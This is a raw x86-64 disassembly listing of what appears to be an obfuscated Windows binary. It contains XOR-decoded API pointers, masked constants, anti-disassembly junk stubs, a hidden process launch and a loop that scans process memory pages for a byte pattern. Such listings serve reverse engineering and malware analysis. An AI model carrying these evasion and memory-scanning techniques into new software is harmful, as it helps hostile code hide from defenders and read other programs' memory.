  404c0f:	4c 8b 1d da 77 00 00 	mov    0x77da(%rip),%r11        # 0x40c3f0
  404c16:	48 8b 05 fb 77 00 00 	mov    0x77fb(%rip),%rax        # 0x40c418
  404c1d:	4c 33 18             	xor    (%rax),%r11
  404c20:	41 ff d3             	call   *%r11
  404c23:	b8 04 01 00 00       	mov    $0x104,%eax
  404c28:	49 89 c0             	mov    %rax,%r8
  404c2b:	48 8d 85 28 fd ff ff 	lea    -0x2d8(%rbp),%rax
  404c32:	49 89 c3             	mov    %rax,%r11
  404c35:	31 c0                	xor    %eax,%eax
  404c37:	49 89 c2             	mov    %rax,%r10
  404c3a:	4c 89 d1             	mov    %r10,%rcx
  404c3d:	4c 89 da             	mov    %r11,%rdx
  404c40:	4c 8b 1d e1 77 00 00 	mov    0x77e1(%rip),%r11        # 0x40c428
  404c47:	48 8b 05 02 78 00 00 	mov    0x7802(%rip),%rax        # 0x40c450
  404c4e:	4c 33 18             	xor    (%rax),%r11
  404c51:	41 ff d3             	call   *%r11
  404c54:	b8 68 00 00 00       	mov    $0x68,%eax
  404c59:	49 89 c0             	mov    %rax,%r8
  404c5c:	b8 00 00 00 00       	mov    $0x0,%eax
  404c61:	49 89 c3             	mov    %rax,%r11
  404c64:	48 8d 85 c0 fc ff ff 	lea    -0x340(%rbp),%rax
  404c6b:	49 89 c2             	mov    %rax,%r10
  404c6e:	4c 89 d1             	mov    %r10,%rcx
  404c71:	4c 89 da             	mov    %r11,%rdx
  404c74:	4c 8b 1d e5 77 00 00 	mov    0x77e5(%rip),%r11        # 0x40c460
  404c7b:	48 8b 05 06 78 00 00 	mov    0x7806(%rip),%rax        # 0x40c488
  404c82:	4c 33 18             	xor    (%rax),%r11
  404c85:	41 ff d3             	call   *%r11
  404c88:	b8 a2 89 21 05       	mov    $0x52189a2,%eax
  404c8d:	81 f0 ba 89 21 05    	xor    $0x52189ba,%eax
  404c93:	49 89 c0             	mov    %rax,%r8
  404c96:	b8 00 00 00 00       	mov    $0x0,%eax
  404c9b:	49 89 c3             	mov    %rax,%r11
  404c9e:	48 8d 85 a8 fc ff ff 	lea    -0x358(%rbp),%rax
  404ca5:	49 89 c2             	mov    %rax,%r10
  404ca8:	4c 89 d1             	mov    %r10,%rcx
  404cab:	4c 89 da             	mov    %r11,%rdx
  404cae:	4c 8b 1d e3 77 00 00 	mov    0x77e3(%rip),%r11        # 0x40c498
  404cb5:	48 8b 05 04 78 00 00 	mov    0x7804(%rip),%rax        # 0x40c4c0
  404cbc:	4c 33 18             	xor    (%rax),%r11
  404cbf:	41 ff d3             	call   *%r11
  404cc2:	b8 68 00 00 00       	mov    $0x68,%eax
  404cc7:	89 85 c0 fc ff ff    	mov    %eax,-0x340(%rbp)
  404ccd:	b8 01 00 00 00       	mov    $0x1,%eax
  404cd2:	89 85 fc fc ff ff    	mov    %eax,-0x304(%rbp)
  404cd8:	b8 00 00 00 00       	mov    $0x0,%eax
  404cdd:	66 89 85 00 fd ff ff 	mov    %ax,-0x300(%rbp)
  404ce4:	48 8d 85 a8 fc ff ff 	lea    -0x358(%rbp),%rax
  404ceb:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  404cf0:	48 8d 85 c0 fc ff ff 	lea    -0x340(%rbp),%rax
  404cf7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  404cfc:	31 c0                	xor    %eax,%eax
  404cfe:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  404d03:	31 c0                	xor    %eax,%eax
  404d05:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404d0a:	b8 00 00 00 08       	mov    $0x8000000,%eax
  404d0f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404d14:	b8 00 00 00 00       	mov    $0x0,%eax
  404d19:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404d1e:	31 c0                	xor    %eax,%eax
  404d20:	49 89 c1             	mov    %rax,%r9
  404d23:	31 c0                	xor    %eax,%eax
  404d25:	49 89 c0             	mov    %rax,%r8
  404d28:	31 c0                	xor    %eax,%eax
  404d2a:	49 89 c3             	mov    %rax,%r11
  404d2d:	48 8d 85 28 fd ff ff 	lea    -0x2d8(%rbp),%rax
  404d34:	49 89 c2             	mov    %rax,%r10
  404d37:	4c 89 d1             	mov    %r10,%rcx
  404d3a:	4c 89 da             	mov    %r11,%rdx
  404d3d:	4c 8b 1d 8c 77 00 00 	mov    0x778c(%rip),%r11        # 0x40c4d0
  404d44:	48 8b 05 ad 77 00 00 	mov    0x77ad(%rip),%rax        # 0x40c4f8
  404d4b:	4c 33 18             	xor    (%rax),%r11
  404d4e:	41 ff d3             	call   *%r11
  404d51:	83 f8 00             	cmp    $0x0,%eax
  404d54:	0f 84 61 00 00 00    	je     0x404dbb
  404d5a:	48 8b 85 b0 fc ff ff 	mov    -0x350(%rbp),%rax
  404d61:	49 89 c2             	mov    %rax,%r10
  404d64:	4c 89 d1             	mov    %r10,%rcx
  404d67:	4c 8b 1d 9a 77 00 00 	mov    0x779a(%rip),%r11        # 0x40c508
  404d6e:	48 8b 05 bb 77 00 00 	mov    0x77bb(%rip),%rax        # 0x40c530
  404d75:	4c 33 18             	xor    (%rax),%r11
  404d78:	41 ff d3             	call   *%r11
  404d7b:	48 8b 85 a8 fc ff ff 	mov    -0x358(%rbp),%rax
  404d82:	49 89 c2             	mov    %rax,%r10
  404d85:	4c 89 d1             	mov    %r10,%rcx
  404d88:	4c 8b 1d b1 77 00 00 	mov    0x77b1(%rip),%r11        # 0x40c540
  404d8f:	48 8b 05 d2 77 00 00 	mov    0x77d2(%rip),%rax        # 0x40c568
  404d96:	4c 33 18             	xor    (%rax),%r11
  404d99:	41 ff d3             	call   *%r11
  404d9c:	b8 00 00 00 00       	mov    $0x0,%eax
  404da1:	49 89 c2             	mov    %rax,%r10
  404da4:	4c 89 d1             	mov    %r10,%rcx
  404da7:	4c 8b 1d ca 77 00 00 	mov    0x77ca(%rip),%r11        # 0x40c578
  404dae:	48 8b 05 eb 77 00 00 	mov    0x77eb(%rip),%rax        # 0x40c5a0
  404db5:	4c 33 18             	xor    (%rax),%r11
  404db8:	41 ff d3             	call   *%r11
  404dbb:	8b 45 fc             	mov    -0x4(%rbp),%eax
  404dbe:	c9                   	leave
  404dbf:	c3                   	ret
  404dc0:	cc                   	int3
  404dc1:	cc                   	int3
  404dc2:	e8 00 00 00 00       	call   0x404dc7
  404dc7:	48 83 c4 08          	add    $0x8,%rsp
  404dcb:	c3                   	ret
  404dcc:	90                   	nop
  404dcd:	90                   	nop
  404dce:	cc                   	int3
  404dcf:	90                   	nop
  404dd0:	eb 0b                	jmp    0x404ddd
  404dd2:	48 31 c0             	xor    %rax,%rax
  404dd5:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  404ddc:	90                   	nop
  404ddd:	55                   	push   %rbp
  404dde:	48 89 e5             	mov    %rsp,%rbp
  404de1:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
  404de8:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  404dec:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  404df0:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  404df4:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  404df8:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404dfc:	48 83 f8 00          	cmp    $0x0,%rax
  404e00:	0f 84 36 00 00 00    	je     0x404e3c
  404e06:	48 8b 45 18          	mov    0x18(%rbp),%rax
  404e0a:	48 83 f8 00          	cmp    $0x0,%rax
  404e0e:	0f 84 28 00 00 00    	je     0x404e3c
  404e14:	8b 45 20             	mov    0x20(%rbp),%eax
  404e17:	83 f8 00             	cmp    $0x0,%eax
  404e1a:	0f 84 1c 00 00 00    	je     0x404e3c
  404e20:	48 8b 45 28          	mov    0x28(%rbp),%rax
  404e24:	48 83 f8 00          	cmp    $0x0,%rax
  404e28:	0f 84 0e 00 00 00    	je     0x404e3c
  404e2e:	48 8b 45 30          	mov    0x30(%rbp),%rax
  404e32:	48 83 f8 00          	cmp    $0x0,%rax
  404e36:	0f 85 0a 00 00 00    	jne    0x404e46
  404e3c:	b8 00 00 00 00       	mov    $0x0,%eax
  404e41:	e9 96 03 00 00       	jmp    0x4051dc
  404e46:	48 8d 05 7f 45 00 00 	lea    0x457f(%rip),%rax        # 0x4093cc
  404e4d:	49 89 c2             	mov    %rax,%r10
  404e50:	4c 89 d1             	mov    %r10,%rcx
  404e53:	4c 8b 1d 6e 6a 00 00 	mov    0x6a6e(%rip),%r11        # 0x40b8c8
  404e5a:	48 8b 05 8f 6a 00 00 	mov    0x6a8f(%rip),%rax        # 0x40b8f0
  404e61:	4c 33 18             	xor    (%rax),%r11
  404e64:	41 ff d3             	call   *%r11
  404e67:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  404e6b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404e6f:	48 83 f8 00          	cmp    $0x0,%rax
  404e73:	0f 85 0a 00 00 00    	jne    0x404e83
  404e79:	b8 00 00 00 00       	mov    $0x0,%eax
  404e7e:	e9 59 03 00 00       	jmp    0x4051dc
  404e83:	48 8d 05 64 45 00 00 	lea    0x4564(%rip),%rax        # 0x4093ee
  404e8a:	49 89 c3             	mov    %rax,%r11
  404e8d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404e91:	49 89 c2             	mov    %rax,%r10
  404e94:	4c 89 d1             	mov    %r10,%rcx
  404e97:	4c 89 da             	mov    %r11,%rdx
  404e9a:	4c 8b 1d 5f 6a 00 00 	mov    0x6a5f(%rip),%r11        # 0x40b900
  404ea1:	48 8b 05 80 6a 00 00 	mov    0x6a80(%rip),%rax        # 0x40b928
  404ea8:	4c 33 18             	xor    (%rax),%r11
  404eab:	41 ff d3             	call   *%r11
  404eae:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  404eb2:	48 8d 05 4c 45 00 00 	lea    0x454c(%rip),%rax        # 0x409405
  404eb9:	49 89 c3             	mov    %rax,%r11
  404ebc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404ec0:	49 89 c2             	mov    %rax,%r10
  404ec3:	4c 89 d1             	mov    %r10,%rcx
  404ec6:	4c 89 da             	mov    %r11,%rdx
  404ec9:	4c 8b 1d 68 6a 00 00 	mov    0x6a68(%rip),%r11        # 0x40b938
  404ed0:	48 8b 05 89 6a 00 00 	mov    0x6a89(%rip),%rax        # 0x40b960
  404ed7:	4c 33 18             	xor    (%rax),%r11
  404eda:	41 ff d3             	call   *%r11
  404edd:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  404ee1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404ee5:	48 83 f8 00          	cmp    $0x0,%rax
  404ee9:	0f 84 0e 00 00 00    	je     0x404efd
  404eef:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404ef3:	48 83 f8 00          	cmp    $0x0,%rax
  404ef7:	0f 85 0a 00 00 00    	jne    0x404f07
  404efd:	b8 00 00 00 00       	mov    $0x0,%eax
  404f02:	e9 d5 02 00 00       	jmp    0x4051dc
  404f07:	b8 aa fa 4b 3d       	mov    $0x3d4bfaaa,%eax
  404f0c:	81 f0 9a fa 4b 3d    	xor    $0x3d4bfa9a,%eax
  404f12:	49 89 c0             	mov    %rax,%r8
  404f15:	b8 00 00 00 00       	mov    $0x0,%eax
  404f1a:	49 89 c3             	mov    %rax,%r11
  404f1d:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
  404f21:	49 89 c2             	mov    %rax,%r10
  404f24:	4c 89 d1             	mov    %r10,%rcx
  404f27:	4c 89 da             	mov    %r11,%rdx
  404f2a:	4c 8b 1d 3f 6a 00 00 	mov    0x6a3f(%rip),%r11        # 0x40b970
  404f31:	48 8b 05 60 6a 00 00 	mov    0x6a60(%rip),%rax        # 0x40b998
  404f38:	4c 33 18             	xor    (%rax),%r11
  404f3b:	41 ff d3             	call   *%r11
  404f3e:	31 c0                	xor    %eax,%eax
  404f40:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  404f44:	48 b8 00 00 ff ff ff 	movabs $0x7fffffff0000,%rax
  404f4b:	7f 00 00 
  404f4e:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  404f52:	31 c0                	xor    %eax,%eax
  404f54:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  404f58:	31 c0                	xor    %eax,%eax
  404f5a:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  404f5e:	b8 00 00 00 00       	mov    $0x0,%eax
  404f63:	89 45 94             	mov    %eax,-0x6c(%rbp)
  404f66:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404f6a:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
  404f6e:	48 39 c8             	cmp    %rcx,%rax
  404f71:	0f 83 36 02 00 00    	jae    0x4051ad
  404f77:	b8 73 33 8f 39       	mov    $0x398f3373,%eax
  404f7c:	81 f0 43 33 8f 39    	xor    $0x398f3343,%eax
  404f82:	49 89 c1             	mov    %rax,%r9
  404f85:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
  404f89:	49 89 c0             	mov    %rax,%r8
  404f8c:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404f90:	49 89 c3             	mov    %rax,%r11
  404f93:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404f97:	49 89 c2             	mov    %rax,%r10
  404f9a:	4c 89 d1             	mov    %r10,%rcx
  404f9d:	4c 89 da             	mov    %r11,%rdx
  404fa0:	4c 8b 5d f0          	mov    -0x10(%rbp),%r11
  404fa4:	41 ff d3             	call   *%r11
  404fa7:	48 83 f8 00          	cmp    $0x0,%rax
  404fab:	0f 85 05 00 00 00    	jne    0x404fb6
  404fb1:	e9 f7 01 00 00       	jmp    0x4051ad
  404fb6:	8b 45 d8             	mov    -0x28(%rbp),%eax
  404fb9:	81 f8 00 10 00 00    	cmp    $0x1000,%eax
  404fbf:	0f 85 b5 01 00 00    	jne    0x40517a
  404fc5:	8b 45 dc             	mov    -0x24(%rbp),%eax
  404fc8:	83 f8 04             	cmp    $0x4,%eax
  404fcb:	0f 84 0c 00 00 00    	je     0x404fdd
  404fd1:	8b 45 dc             	mov    -0x24(%rbp),%eax
  404fd4:	83 f8 40             	cmp    $0x40,%eax
  404fd7:	0f 85 9d 01 00 00    	jne    0x40517a
  404fdd:	8b 45 dc             	mov    -0x24(%rbp),%eax
  404fe0:	81 e0 00 01 00 00    	and    $0x100,%eax
  404fe6:	83 f8 00             	cmp    $0x0,%eax
  404fe9:	0f 85 8b 01 00 00    	jne    0x40517a
  404fef:	8b 45 dc             	mov    -0x24(%rbp),%eax
  404ff2:	83 e0 01             	and    $0x1,%eax
  404ff5:	83 f8 00             	cmp    $0x0,%eax
  404ff8:	0f 85 7c 01 00 00    	jne    0x40517a
  404ffe:	8b 45 20             	mov    0x20(%rbp),%eax
  405001:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  405005:	48 39 c1             	cmp    %rax,%rcx
  405008:	0f 82 6c 01 00 00    	jb     0x40517a
  40500e:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  405012:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  405016:	48 39 c8             	cmp    %rcx,%rax
  405019:	0f 83 6e 00 00 00    	jae    0x40508d
  40501f:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405023:	48 83 f8 00          	cmp    $0x0,%rax
  405027:	0f 84 1e 00 00 00    	je     0x40504b
  40502d:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405031:	49 89 c2             	mov    %rax,%r10
  405034:	4c 89 d1             	mov    %r10,%rcx
  405037:	4c 8b 1d 6a 69 00 00 	mov    0x696a(%rip),%r11        # 0x40b9a8
  40503e:	48 8b 05 8b 69 00 00 	mov    0x698b(%rip),%rax        # 0x40b9d0
  405045:	4c 33 18             	xor    (%rax),%r11
  405048:	41 ff d3             	call   *%r11
  40504b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40504f:	49 89 c2             	mov    %rax,%r10
  405052:	4c 89 d1             	mov    %r10,%rcx
  405055:	4c 8b 1d 84 69 00 00 	mov    0x6984(%rip),%r11        # 0x40b9e0
  40505c:	48 8b 05 a5 69 00 00 	mov    0x69a5(%rip),%rax        # 0x40ba08
  405063:	4c 33 18             	xor    (%rax),%r11
  405066:	41 ff d3             	call   *%r11
  405069:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  40506d:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405071:	48 83 f8 00          	cmp    $0x0,%rax
  405075:	0f 85 0a 00 00 00    	jne    0x405085
  40507b:	b8 00 00 00 00       	mov    $0x0,%eax
  405080:	e9 57 01 00 00       	jmp    0x4051dc
  405085:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  405089:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  40508d:	31 c0                	xor    %eax,%eax
  40508f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  405093:	48 8d 45 88          	lea    -0x78(%rbp),%rax
  405097:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40509c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4050a0:	49 89 c1             	mov    %rax,%r9
  4050a3:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4050a7:	49 89 c0             	mov    %rax,%r8
  4050aa:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4050ae:	49 89 c3             	mov    %rax,%r11
  4050b1:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4050b5:	49 89 c2             	mov    %rax,%r10
  4050b8:	4c 89 d1             	mov    %r10,%rcx
  4050bb:	4c 89 da             	mov    %r11,%rdx
  4050be:	4c 8b 5d e8          	mov    -0x18(%rbp),%r11
  4050c2:	41 ff d3             	call   *%r11
  4050c5:	83 f8 00             	cmp    $0x0,%eax
  4050c8:	0f 84 ac 00 00 00    	je     0x40517a
  4050ce:	31 c0                	xor    %eax,%eax
  4050d0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4050d4:	8b 45 20             	mov    0x20(%rbp),%eax
  4050d7:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
  4050db:	48 29 c1             	sub    %rax,%rcx
  4050de:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4050e2:	48 39 c8             	cmp    %rcx,%rax
  4050e5:	0f 87 7e 00 00 00    	ja     0x405169
  4050eb:	e9 11 00 00 00       	jmp    0x405101
  4050f0:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4050f4:	48 89 c1             	mov    %rax,%rcx
  4050f7:	48 83 c0 01          	add    $0x1,%rax
  4050fb:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4050ff:	eb d3                	jmp    0x4050d4
  405101:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  405105:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
  405109:	48 01 c1             	add    %rax,%rcx
  40510c:	8b 45 20             	mov    0x20(%rbp),%eax
  40510f:	49 89 c0             	mov    %rax,%r8
  405112:	48 8b 45 18          	mov    0x18(%rbp),%rax
  405116:	49 89 c3             	mov    %rax,%r11
  405119:	49 89 ca             	mov    %rcx,%r10
  40511c:	4c 89 d1             	mov    %r10,%rcx
  40511f:	4c 89 da             	mov    %r11,%rdx
  405122:	4c 8b 1d ef 68 00 00 	mov    0x68ef(%rip),%r11        # 0x40ba18
  405129:	48 8b 05 10 69 00 00 	mov    0x6910(%rip),%rax        # 0x40ba40
  405130:	4c 33 18             	xor    (%rax),%r11
  405133:	41 ff d3             	call   *%r11
  405136:	83 f8 00             	cmp    $0x0,%eax
  405139:	0f 85 28 00 00 00    	jne    0x405167
  40513f:	48 8b 45 28          	mov    0x28(%rbp),%rax
  405143:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
  405147:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  40514b:	48 01 ca             	add    %rcx,%rdx
  40514e:	48 89 10             	mov    %rdx,(%rax)
  405151:	48 8b 45 30          	mov    0x30(%rbp),%rax
  405155:	8b 4d 20             	mov    0x20(%rbp),%ecx
  405158:	89 08                	mov    %ecx,(%rax)
  40515a:	b8 01 00 00 00       	mov    $0x1,%eax
  40515f:	89 45 94             	mov    %eax,-0x6c(%rbp)
  405162:	e9 02 00 00 00       	jmp    0x405169
  405167:	eb 87                	jmp    0x4050f0
  405169:	8b 45 94             	mov    -0x6c(%rbp),%eax
  40516c:	83 f8 00             	cmp    $0x0,%eax
  40516f:	0f 84 05 00 00 00    	je     0x40517a
  405175:	e9 33 00 00 00       	jmp    0x4051ad
  40517a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40517e:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
  405182:	48 01 c1             	add    %rax,%rcx
  405185:	48 89 4d b0          	mov    %rcx,-0x50(%rbp)
  405189:	b8 01 00 00 00       	mov    $0x1,%eax
  40518e:	49 89 c2             	mov    %rax,%r10
  405191:	4c 89 d1             	mov    %r10,%rcx
  405194:	4c 8b 1d b5 68 00 00 	mov    0x68b5(%rip),%r11        # 0x40ba50
  40519b:	48 8b 05 d6 68 00 00 	mov    0x68d6(%rip),%rax        # 0x40ba78
  4051a2:	4c 33 18             	xor    (%rax),%r11
  4051a5:	41 ff d3             	call   *%r11
  4051a8:	e9 b9 fd ff ff       	jmp    0x404f66
  4051ad:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4051b1:	48 83 f8 00          	cmp    $0x0,%rax
  4051b5:	0f 84 1e 00 00 00    	je     0x4051d9
  4051bb:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4051bf:	49 89 c2             	mov    %rax,%r10
  4051c2:	4c 89 d1             	mov    %r10,%rcx
  4051c5:	4c 8b 1d bc 68 00 00 	mov    0x68bc(%rip),%r11        # 0x40ba88
  4051cc:	48 8b 05 dd 68 00 00 	mov    0x68dd(%rip),%rax        # 0x40bab0
  4051d3:	4c 33 18             	xor    (%rax),%r11
  4051d6:	41 ff d3             	call   *%r11
  4051d9:	8b 45 94             	mov    -0x6c(%rbp),%eax
  4051dc:	c9                   	leave
  4051dd:	c3                   	ret
  4051de:	cc                   	int3
  4051df:	cc                   	int3
  4051e0:	e8 00 00 00 00       	call   0x4051e5
  4051e5:	48 83 c4 08          	add    $0x8,%rsp
  4051e9:	c3                   	ret
  4051ea:	90                   	nop
  4051eb:	90                   	nop
  4051ec:	cc                   	int3
  4051ed:	90                   	nop
  4051ee:	eb 0b                	jmp    0x4051fb
  4051f0:	48 31 c0             	xor    %rax,%rax
  4051f3:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4051fa:	90                   	nop
  4051fb:	55                   	push   %rbp
  4051fc:	48 89 e5             	mov    %rsp,%rbp
  4051ff:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
  405206:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40520a:	b8 e3 e8 4e 4c       	mov    $0x4c4ee8e3,%eax
  40520f:	81 f0 eb ea 4e 4c    	xor    $0x4c4eeaeb,%eax
  405215:	49 89 c0             	mov    %rax,%r8
  405218:	b8 00 00 00 00       	mov    $0x0,%eax
  40521d:	49 89 c3             	mov    %rax,%r11
  405220:	48 8d 85 f8 fd ff ff 	lea    -0x208(%rbp),%rax
  405227:	49 89 c2             	mov    %rax,%r10
  40522a:	4c 89 d1             	mov    %r10,%rcx
  40522d:	4c 89 da             	mov    %r11,%rdx
  405230:	4c 8b 1d 09 5e 00 00 	mov    0x5e09(%rip),%r11        # 0x40b040
  405237:	48 8b 05 2a 5e 00 00 	mov    0x5e2a(%rip),%rax        # 0x40b068
  40523e:	4c 33 18             	xor    (%rax),%r11
  405241:	41 ff d3             	call   *%r11
  405244:	48 8d 05 01 3f 00 00 	lea    0x3f01(%rip),%rax        # 0x40914c
  40524b:	49 89 c2             	mov    %rax,%r10
  40524e:	4c 89 d1             	mov    %r10,%rcx
  405251:	4c 8b 1d 20 5e 00 00 	mov    0x5e20(%rip),%r11        # 0x40b078
  405258:	48 8b 05 41 5e 00 00 	mov    0x5e41(%rip),%rax        # 0x40b0a0
  40525f:	4c 33 18             	xor    (%rax),%r11
  405262:	41 ff d3             	call   *%r11
  405265:	48 89 85 f0 fd ff ff 	mov    %rax,-0x210(%rbp)
  40526c:	48 8b 85 f0 fd ff ff 	mov    -0x210(%rbp),%rax
  405273:	48 83 f8 00          	cmp    $0x0,%rax
  405277:	0f 85 05 00 00 00    	jne    0x405282
  40527d:	e9 14 01 00 00       	jmp    0x405396
  405282:	48 8d 05 e3 3e 00 00 	lea    0x3ee3(%rip),%rax        # 0x40916c
  405289:	49 89 c3             	mov    %rax,%r11
  40528c:	48 8b 85 f0 fd ff ff 	mov    -0x210(%rbp),%rax
  405293:	49 89 c2             	mov    %rax,%r10
  405296:	4c 89 d1             	mov    %r10,%rcx
  405299:	4c 89 da             	mov    %r11,%rdx
  40529c:	4c 8b 1d 0d 5e 00 00 	mov    0x5e0d(%rip),%r11        # 0x40b0b0
  4052a3:	48 8b 05 2e 5e 00 00 	mov    0x5e2e(%rip),%rax        # 0x40b0d8
  4052aa:	4c 33 18             	xor    (%rax),%r11
  4052ad:	41 ff d3             	call   *%r11
  4052b0:	48 89 85 e8 fd ff ff 	mov    %rax,-0x218(%rbp)
  4052b7:	b8 04 01 00 00       	mov    $0x104,%eax
  4052bc:	49 89 c0             	mov    %rax,%r8
  4052bf:	48 8d 85 f8 fd ff ff 	lea    -0x208(%rbp),%rax
  4052c6:	49 89 c3             	mov    %rax,%r11
  4052c9:	31 c0                	xor    %eax,%eax
  4052cb:	49 89 c2             	mov    %rax,%r10
  4052ce:	4c 89 d1             	mov    %r10,%rcx
  4052d1:	4c 89 da             	mov    %r11,%rdx
  4052d4:	4c 8b 1d 0d 5e 00 00 	mov    0x5e0d(%rip),%r11        # 0x40b0e8
  4052db:	48 8b 05 2e 5e 00 00 	mov    0x5e2e(%rip),%rax        # 0x40b110
  4052e2:	4c 33 18             	xor    (%rax),%r11
  4052e5:	41 ff d3             	call   *%r11
  4052e8:	48 8b 85 e8 fd ff ff 	mov    -0x218(%rbp),%rax
  4052ef:	48 83 f8 00          	cmp    $0x0,%rax
  4052f3:	0f 84 7c 00 00 00    	je     0x405375
  4052f9:	4c 8b 9d e8 fd ff ff 	mov    -0x218(%rbp),%r11
  405300:	41 ff d3             	call   *%r11
  405303:	83 f8 00             	cmp    $0x0,%eax
  405306:	0f 85 69 00 00 00    	jne    0x405375
  40530c:	48 8b 85 f0 fd ff ff 	mov    -0x210(%rbp),%rax
  405313:	49 89 c2             	mov    %rax,%r10
  405316:	4c 89 d1             	mov    %r10,%rcx
  405319:	4c 8b 1d 00 5e 00 00 	mov    0x5e00(%rip),%r11        # 0x40b120
  405320:	48 8b 05 21 5e 00 00 	mov    0x5e21(%rip),%rax        # 0x40b148
  405327:	4c 33 18             	xor    (%rax),%r11
  40532a:	41 ff d3             	call   *%r11
  40532d:	31 c0                	xor    %eax,%eax
  40532f:	49 89 c3             	mov    %rax,%r11
  405332:	48 8d 85 f8 fd ff ff 	lea    -0x208(%rbp),%rax
  405339:	49 89 c2             	mov    %rax,%r10
  40533c:	4c 89 d1             	mov    %r10,%rcx
  40533f:	4c 89 da             	mov    %r11,%rdx
  405342:	4c 8b 1d 0f 5e 00 00 	mov    0x5e0f(%rip),%r11        # 0x40b158
  405349:	48 8b 05 30 5e 00 00 	mov    0x5e30(%rip),%rax        # 0x40b180
  405350:	4c 33 18             	xor    (%rax),%r11
  405353:	41 ff d3             	call   *%r11
  405356:	b8 00 00 00 00       	mov    $0x0,%eax
  40535b:	49 89 c2             	mov    %rax,%r10
  40535e:	4c 89 d1             	mov    %r10,%rcx
  405361:	4c 8b 1d 28 5e 00 00 	mov    0x5e28(%rip),%r11        # 0x40b190
  405368:	48 8b 05 49 5e 00 00 	mov    0x5e49(%rip),%rax        # 0x40b1b8
  40536f:	4c 33 18             	xor    (%rax),%r11
  405372:	41 ff d3             	call   *%r11
  405375:	48 8b 85 f0 fd ff ff 	mov    -0x210(%rbp),%rax
  40537c:	49 89 c2             	mov    %rax,%r10
  40537f:	4c 89 d1             	mov    %r10,%rcx
  405382:	4c 8b 1d 3f 5e 00 00 	mov    0x5e3f(%rip),%r11        # 0x40b1c8
  405389:	48 8b 05 60 5e 00 00 	mov    0x5e60(%rip),%rax        # 0x40b1f0
  405390:	4c 33 18             	xor    (%rax),%r11
  405393:	41 ff d3             	call   *%r11
  405396:	c9                   	leave
  405397:	c3                   	ret
  405398:	cc                   	int3
  405399:	cc                   	int3
  40539a:	e8 00 00 00 00       	call   0x40539f
  40539f:	48 83 c4 08          	add    $0x8,%rsp
  4053a3:	c3                   	ret
  4053a4:	90                   	nop
  4053a5:	90                   	nop
  4053a6:	cc                   	int3
  4053a7:	90                   	nop
  4053a8:	eb 0b                	jmp    0x4053b5
  4053aa:	48 31 c0             	xor    %rax,%rax
  4053ad:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4053b4:	90                   	nop
  4053b5:	55                   	push   %rbp
  4053b6:	48 89 e5             	mov    %rsp,%rbp
  4053b9:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  4053c0:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4053c4:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4053c8:	48 83 f8 10          	cmp    $0x10,%rax
  4053cc:	0f 83 0a 00 00 00    	jae    0x4053dc
  4053d2:	b8 0c 00 00 00       	mov    $0xc,%eax
  4053d7:	e9 bc 00 00 00       	jmp    0x405498
  4053dc:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4053e0:	48 83 f8 20          	cmp    $0x20,%rax
